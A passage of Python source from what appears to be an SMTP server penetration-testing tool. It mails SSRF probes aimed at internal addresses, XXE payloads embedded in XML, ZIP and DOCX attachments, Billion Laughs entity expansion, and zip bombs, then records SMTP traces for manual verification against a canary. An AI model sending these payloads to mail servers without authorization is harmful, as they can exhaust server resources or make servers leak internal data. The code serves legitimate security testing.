            smtp, conn_err = _connect_ssrf()
            sent, accepted, rejected, err_count = 0, 0, 0, 0
            smtp_trace: list[str] = []
            if smtp is None:
                err_count = 1
                _ssrf_trace_append(smtp_trace, f"Connect: {conn_err}")
            else:
                try:
                    ehlo_st, ehlo_reply = smtp.docmd("EHLO", self.fqdn or "ssrf-test.local")
                    _ssrf_trace_append(smtp_trace, f"EHLO: {self._smtp_trace_reply(ehlo_st, ehlo_reply)}")
                    used_auth, auth_err = self._mail_test_auth_login(
                        smtp,
                        smtp_trace,
                        trace_append=lambda line: _ssrf_trace_append(smtp_trace, line),
                    )
                    if auth_err:
                        err_count = 1
                        _ssrf_trace_append(smtp_trace, auth_err)
                    elif used_auth:
                        auth_used = True
                    if not auth_err:
                        mail_st, mail_reply = smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                        _ssrf_trace_append(
                            smtp_trace,
                            f"MAIL FROM <{mail_from}>: {self._smtp_trace_reply(mail_st, mail_reply)}",
                        )
                        if mail_st not in (250, 251):
                            rejected = 1
                            sent = 1
                        else:
                            status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                            _ssrf_trace_append(
                                smtp_trace,
                                f"RCPT TO <{rcpt}>: {self._smtp_trace_reply(status, reply)}",
                            )
                            if status not in (250, 251):
                                rejected = 1
                                sent = 1
                            else:
                                for c in cc_list:
                                    s, cc_reply = smtp.docmd("RCPT", f"TO:<{c}>")
                                    _ssrf_trace_append(
                                        smtp_trace,
                                        f"RCPT TO <{c}>: {self._smtp_trace_reply(s, cc_reply)}",
                                    )
                                    if s not in (250, 251):
                                        break
                                data_status, data_reply = smtp.data(raw_msg)
                                sent = 1
                                _ssrf_trace_append(
                                    smtp_trace,
                                    self._data_trace_entry(raw_msg, data_status, data_reply),
                                )
                                if data_status == 250:
                                    accepted = 1
                                else:
                                    rejected = 1
                    try:
                        smtp.quit()
                    except Exception:
                        pass
                except (
                    smtplib.SMTPResponseException,
                    smtplib.SMTPServerDisconnected,
                    ConnectionResetError,
                    BrokenPipeError,
                    OSError,
                    socket.timeout,
                ) as e:
                    err_count = 1
                    _ssrf_trace_append(smtp_trace, f"error: {e}")
                    try:
                        smtp.quit()
                    except Exception:
                        pass
            detail = f"{accepted} accepted, {rejected} rejected, {err_count} error" if sent or err_count else "skipped"
            variant_result = SsrfVariantResult(
                variant=var_name,
                sent=max(sent, 1) if (accepted or rejected or err_count) else 0,
                accepted=accepted,
                rejected=rejected,
                error=err_count,
                smtp_trace=tuple(smtp_trace),
                detail=detail,
                message_summary=(),
                test_id=ssrf_test_id if accepted else "",
            )
            var_results.append(variant_result)
            if not self.use_json and self.args.debug:
                self._ssrf_streamed_live = True
                self._ssrf_stream_variant_section(variant_result, rcpt, stream_trace=True)

        if incl_internal:
            for internal_url, label in [
                ("http://127.0.0.1/ssrf-pt-test", "internal_127"),
                ("http://localhost/ssrf-pt-test", "internal_localhost"),
                ("http://10.0.0.1/ssrf-pt-test", "internal_10"),
            ]:
                body = self._outbound_data_with_url(internal_url)
                internal_test_id = self._new_mail_test_id()
                raw_msg = _build_ssrf_mime(self._outbound_subject(), body, None, internal_test_id)
                smtp, conn_err = _connect_ssrf()
                sent, accepted, rejected, err_count = 0, 0, 0, 0
                smtp_trace: list[str] = []
                if smtp is None:
                    err_count = 1
                    _ssrf_trace_append(smtp_trace, f"Connect: {conn_err}")
                else:
                    try:
                        ehlo_st, ehlo_reply = smtp.docmd("EHLO", self.fqdn or "ssrf-test.local")
                        _ssrf_trace_append(smtp_trace, f"EHLO: {self._smtp_trace_reply(ehlo_st, ehlo_reply)}")
                        mail_st, mail_reply = smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                        _ssrf_trace_append(
                            smtp_trace,
                            f"MAIL FROM <{mail_from}>: {self._smtp_trace_reply(mail_st, mail_reply)}",
                        )
                        if mail_st not in (250, 251):
                            rejected = 1
                            sent = 1
                        else:
                            status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                            _ssrf_trace_append(
                                smtp_trace,
                                f"RCPT TO <{rcpt}>: {self._smtp_trace_reply(status, reply)}",
                            )
                            if status not in (250, 251):
                                rejected = 1
                                sent = 1
                            else:
                                data_status, data_reply = smtp.data(raw_msg)
                                sent = 1
                                _ssrf_trace_append(
                                    smtp_trace,
                                    self._data_trace_entry(raw_msg, data_status, data_reply),
                                )
                                if data_status == 250:
                                    accepted = 1
                                else:
                                    rejected = 1
                        try:
                            smtp.quit()
                        except Exception:
                            pass
                    except Exception as e:
                        err_count = 1
                        _ssrf_trace_append(smtp_trace, str(e))
                        try:
                            smtp.quit()
                        except Exception:
                            pass
                int_detail = f"{accepted} accepted, {rejected} rejected, {err_count} error"
                internal_result = SsrfVariantResult(
                    variant=label,
                    sent=sent or 1,
                    accepted=accepted,
                    rejected=rejected,
                    error=err_count,
                    smtp_trace=tuple(smtp_trace),
                    detail=int_detail,
                    message_summary=(),
                    test_id=internal_test_id if accepted else "",
                )
                var_results.append(internal_result)
                if not self.use_json and self.args.debug:
                    self._ssrf_streamed_live = True
                    self._ssrf_stream_variant_section(internal_result, rcpt, stream_trace=True)

        elapsed = time.perf_counter() - start_time
        total_accepted = sum(v.accepted for v in var_results)
        total_sent = sum(v.sent for v in var_results)
        detail = f"{total_accepted}/{total_sent} variants sent successfully. Check canary for incoming HTTP requests."
        if total_sent == 0:
            detail = "No variants sent; check connection and definitions."
        return SsrfResult(
            manual_verification_required=True,
            canary_url=canary_url,
            variants=tuple(var_results),
            elapsed_sec=elapsed,
            auth_used=auth_used,
            detail=detail,
            verification_instructions=VERIFICATION_INSTRUCTIONS,
        )

    def _get_zipxxe_definitions_path(self) -> Path:
        """Base path for ZIPXXE variant definitions (ptsrvtester/tests/smtp/zipxxe)."""
        # parents[3] = ptsrvtester package root (this file is modules/smtp/tests/content.py)
        return Path(__file__).resolve().parents[3] / "tests" / "smtp" / "zipxxe"

    def test_zipxxe(self) -> ZipxxeResult:
        """
        Test Zip Bomb, XML Entity Expansion (Billion Laughs), XXE in ZIP/OOXML (PTL-SVC-SMTP-ZIPXXE).
        Sends emails with malicious attachments/body. User monitors server and canary for impact.
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt = str(self.args.rcpt_to).strip()
        canary_url = str(getattr(self.args, "zipxxe_canary_url", "") or "").strip()
        mail_from = self.args.mail_from or f"zipxxetest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        from_name = getattr(self.args, "from_name", None) or ""
        timeout = max(5.0, getattr(self.args, "zipxxe_timeout", 30.0))
        variants_arg = getattr(self.args, "zipxxe_variants", None)
        incl_zip_bomb = getattr(self.args, "zipxxe_zip_bomb", False)
        incl_zip_bomb_full = getattr(self.args, "zipxxe_zip_bomb_full", False)
        default_variants = ["billion_laughs_attach", "billion_laughs_body", "xxe_zip", "xxe_docx", "xxe_body"]
        if variants_arg:
            variants = [v.strip().lower() for v in variants_arg.split(",") if v.strip()]
        else:
            variants = list(default_variants)
        if incl_zip_bomb and "zip_bomb" not in variants:
            variants.append("zip_bomb")
        if incl_zip_bomb_full and "zip_bomb_full" not in variants:
            variants.append("zip_bomb_full")

        def _xxe_xml_template(url: str) -> str:
            return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>
<document><content>&xxe;</content></document>'''

        def _build_zip_with_xxe(url: str) -> bytes:
            bio = BytesIO()
            xml_content = _xxe_xml_template(url).encode("utf-8")
            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("report.xml", xml_content)
            return bio.getvalue()

        def _build_minimal_docx_with_xxe(url: str) -> bytes:
            """Minimal OOXML .docx with XXE in word/document.xml."""
            xml_content = _xxe_xml_template(url).encode("utf-8")
            bio = BytesIO()
            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("[Content_Types].xml", (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                    '<Default Extension="xml" ContentType="application/xml"/>'
                    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
                    '</Types>'
                ).encode("utf-8"))
                zf.writestr("_rels/.rels", (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
                    '</Relationships>'
                ).encode("utf-8"))
                zf.writestr("word/document.xml", xml_content)
            return bio.getvalue()

        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        from_hdr = f'"{from_name}" <{mail_from}>' if from_name else f"<{mail_from}>"
        start_time = time.perf_counter()
        auth_used = False
        var_results: list[ZipxxeVariantResult] = []
        self._zipxxe_streamed_live = False
        self._zipxxe_canary_streamed = False
        VERIFICATION_INSTRUCTIONS = (
            "Monitor server CPU, memory, disk, SMTP responsiveness. For XXE variants, check canary for HTTP requests. "
            "FAIL if significant slowdown, freeze, restart, or disk exhaustion occurs."
        )

        if not self.use_json and self.args.debug and canary_url:
            pp = ptprinthelper.ptprint
            pp("Canary URL", bullet_type="TITLE", condition=True, indent=4)
            pp(canary_url, bullet_type="TEXT", condition=True, indent=8)
            self._zipxxe_canary_streamed = True

        def _zipxxe_trace_append(trace: list[str], line: str) -> None:
            trace.append(line)

        def _connect_zipxxe() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                    return smtp, ""
                smtp = smtplib.SMTP(timeout=timeout)
                st, _ = smtp.connect(host, port)
                if st != 220:
                    return None, f"Connect: {st}"
                if use_starttls:
                    st2, _ = smtp.docmd("STARTTLS")
                    if st2 != 220:
                        return None, f"STARTTLS: {st2}"
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, ""
            except Exception as e:
                return None, str(e)

        def _build_mime_with_attachment(
            subject: str,
            body: str,
            attachment_data: bytes,
            filename: str,
            test_id: str,
            content_type: str = "application/octet-stream",
        ) -> str:
            msg = MIMEMultipart("mixed")
            msg["Subject"] = subject
            msg["From"] = from_hdr
            msg["To"] = f"<{rcpt}>"
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg[EMAIL_HDR_TEST] = EMAIL_TEST_ZIPXXE
            msg[EMAIL_HDR_TEST_ID] = test_id
            msg.attach(MIMEText(body, "plain", "utf-8"))
            part = MIMEBase(*content_type.split("/", 1))
            part.set_payload(attachment_data)
            encode_base64(part)
            part.add_header("Content-Disposition", "attachment", filename=filename)
            msg.attach(part)
            return msg.as_string()

        for var_name in variants:
            if var_name in ("xxe_zip", "xxe_docx", "xxe_body") and not canary_url:
                continue
            smtp, conn_err = _connect_zipxxe()
            sent, accepted, rejected, err_count = 0, 0, 0, 0
            smtp_trace: list[str] = []
            zip_test_id = ""
            if smtp is None:
                err_count = 1
                _zipxxe_trace_append(smtp_trace, f"Connect: {conn_err}")
            else:
                try:
                    subject = self._outbound_subject()
                    body = self._outbound_data()
                    zip_test_id = self._new_mail_test_id()
                    if var_name == "billion_laughs_attach":
                        raw_msg = _build_mime_with_attachment(
                            subject,
                            body,
                            BILLION_LAUGHS_XML.encode("utf-8"),
                            "billion_laughs.xml",
                            zip_test_id,
                            "application/xml",
                        )
                    elif var_name == "billion_laughs_body":
                        raw_msg = self._mime_add_test_id_header(
                            (
                                f"From: {from_hdr}\r\n"
                                f"To: <{rcpt}>\r\n"
                                f"Subject: {subject}\r\n"
                                f"MIME-Version: 1.0\r\n"
                                f"Content-Type: application/xml; charset=utf-8\r\n"
                                f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n"
                                f"{EMAIL_HDR_TEST}: {EMAIL_TEST_ZIPXXE}\r\n"
                                f"\r\n{BILLION_LAUGHS_XML}"
                            ),
                            zip_test_id,
                        )
                    elif var_name == "xxe_zip":
                        zip_data = _build_zip_with_xxe(canary_url)
                        raw_msg = _build_mime_with_attachment(
                            subject, body, zip_data, "report.zip", zip_test_id, "application/zip"
                        )
                    elif var_name == "xxe_docx":
                        docx_data = _build_minimal_docx_with_xxe(canary_url)
                        raw_msg = _build_mime_with_attachment(
                            subject,
                            body,
                            docx_data,
                            "document.docx",
                            zip_test_id,
                            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                        )
                    elif var_name == "xxe_body":
                        xxe_body_xml = _xxe_xml_template(canary_url)
                        raw_msg = self._mime_add_test_id_header(
                            (
                                f"From: {from_hdr}\r\n"
                                f"To: <{rcpt}>\r\n"
                                f"Subject: {subject}\r\n"
                                f"MIME-Version: 1.0\r\n"
                                f"Content-Type: application/xml; charset=utf-8\r\n"
                                f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n"
                                f"{EMAIL_HDR_TEST}: {EMAIL_TEST_ZIPXXE}\r\n"
                                f"\r\n{xxe_body_xml}"
                            ),
                            zip_test_id,
                        )
                    elif var_name == "zip_bomb":
                        zip_data = build_minimal_zip_bomb()
                        raw_msg = _build_mime_with_attachment(
                            subject, body, zip_data, "zipbomb.zip", zip_test_id, "application/zip"
                        )
                    elif var_name == "zip_bomb_full":
                        zip_data = build_full_zip_bomb()
                        raw_msg = _build_mime_with_attachment(
                            subject, body, zip_data, "zipbomb_full.zip", zip_test_id, "application/zip"
                        )
                    else:
                        continue
                    ehlo_st, ehlo_reply = smtp.docmd("EHLO", self.fqdn or "zipxxe-test.local")
                    _zipxxe_trace_append(smtp_trace, f"EHLO: {self._smtp_trace_reply(ehlo_st, ehlo_reply)}")
                    used_auth, auth_err = self._mail_test_auth_login(
                        smtp,
                        smtp_trace,
                        trace_append=lambda line: _zipxxe_trace_append(smtp_trace, line),
                    )
                    if auth_err:
                        err_count = 1
                        _zipxxe_trace_append(smtp_trace, auth_err)
                    elif used_auth:
                        auth_used = True
                    if not auth_err:
                        mail_st, mail_reply = smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                        _zipxxe_trace_append(
                            smtp_trace,
                            f"MAIL FROM <{mail_from}>: {self._smtp_trace_reply(mail_st, mail_reply)}",
                        )
                        if mail_st not in (250, 251):
                            rejected = 1
                            sent = 1
                        else:
                            status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                            _zipxxe_trace_append(
                                smtp_trace,
                                f"RCPT TO <{rcpt}>: {self._smtp_trace_reply(status, reply)}",
                            )
                            if status not in (250, 251):
                                rejected = 1
                                sent = 1
                            else:
                                data_status, data_reply = smtp.data(raw_msg)
                                sent = 1
                                _zipxxe_trace_append(
                                    smtp_trace,
                                    self._data_trace_entry(raw_msg, data_status, data_reply),
                                )
                                if data_status == 250:
                                    accepted = 1
                                else:
                                    rejected = 1
                    try:
                        smtp.quit()
                    except Exception:
                        pass
                except (
                    smtplib.SMTPResponseException,
                    smtplib.SMTPServerDisconnected,
                    ConnectionResetError,
                    BrokenPipeError,
                    OSError,
                    socket.timeout,
                ) as e:
                    err_count = 1
                    _zipxxe_trace_append(smtp_trace, f"error: {e}")
                    try:
                        if smtp:
                            smtp.quit()
                    except Exception:
                        pass
            detail = f"{accepted} accepted, {rejected} rejected, {err_count} error" if sent or err_count else "skipped"
            variant_result = ZipxxeVariantResult(
                variant=var_name,
                sent=max(sent, 1) if (accepted or rejected or err_count) else 0,
                accepted=accepted,
                rejected=rejected,
                error=err_count,
                smtp_trace=tuple(smtp_trace),
                detail=detail,
                message_summary=(),
                test_id=zip_test_id if accepted else "",
            )
            var_results.append(variant_result)
            if not self.use_json and self.args.debug:
                self._zipxxe_streamed_live = True
                self._zipxxe_stream_variant_section(variant_result, rcpt, stream_trace=True)

        elapsed = time.perf_counter() - start_time
        total_accepted = sum(v.accepted for v in var_results)
        total_sent = sum(v.sent for v in var_results)

        def _rejected_at_rcpt(v: ZipxxeVariantResult) -> bool:
            if v.error:
                return False
            return any(
                ln.startswith("RCPT:") and "rejected" in ln.lower()
                for ln in v.smtp_trace
            )

        all_rejected_at_rcpt = (
            len(var_results) > 0 and all(_rejected_at_rcpt(v) for v in var_results)
        )

        if total_sent == 0:
            detail = "No variants sent; check connection."
        else:
            detail = f"{total_accepted}/{total_sent} variants with successful DATA (250 OK)."
        return ZipxxeResult(
            manual_verification_required=True,
            canary_url=canary_url or "",
            variants=tuple(var_results),
            elapsed_sec=elapsed,
            auth_used=auth_used,
            detail=detail,
            verification_instructions=VERIFICATION_INSTRUCTIONS,
            all_rejected_at_rcpt=all_rejected_at_rcpt,
        )
